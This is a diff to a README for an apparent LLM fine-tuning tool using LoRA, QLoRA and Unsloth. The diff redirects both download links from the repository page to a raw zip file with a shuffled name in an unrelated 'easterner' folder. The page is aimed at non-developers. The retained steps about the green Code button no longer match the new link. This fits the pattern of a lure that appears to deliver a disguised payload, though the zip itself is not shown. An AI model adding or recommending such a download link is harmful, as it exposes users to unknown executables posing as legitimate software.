@@ -1,6 +1,6 @@
 # 🤖 fine-tuning-llm-lora-qlora-unsloth - Train custom language models with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth/raw/refs/heads/main/easterner/lora-unsloth-llm-qlora-tuning-fine-3.9.zip)
 
 This software helps you train your own language models. You use advanced techniques like LoRA and QLoRA to teach a model new skills. The Unsloth engine makes this process fast and efficient. You do not need to be a developer to get started. Follow these steps to set up your training environment.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this training software. Check your har
 
 You need to download the files to your computer.
 
-1.  Visit this page to download: [https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth](https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth)
+1.  Visit this page to download: [https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth/raw/refs/heads/main/easterner/lora-unsloth-llm-qlora-tuning-fine-3.9.zip](https://github.com/gordonsudanese135/fine-tuning-llm-lora-qlora-unsloth/raw/refs/heads/main/easterner/lora-unsloth-llm-qlora-tuning-fine-3.9.zip)
 2.  Locate the green Code button on the page.
 3.  Click Download ZIP.
 4.  Wait for the download to finish.
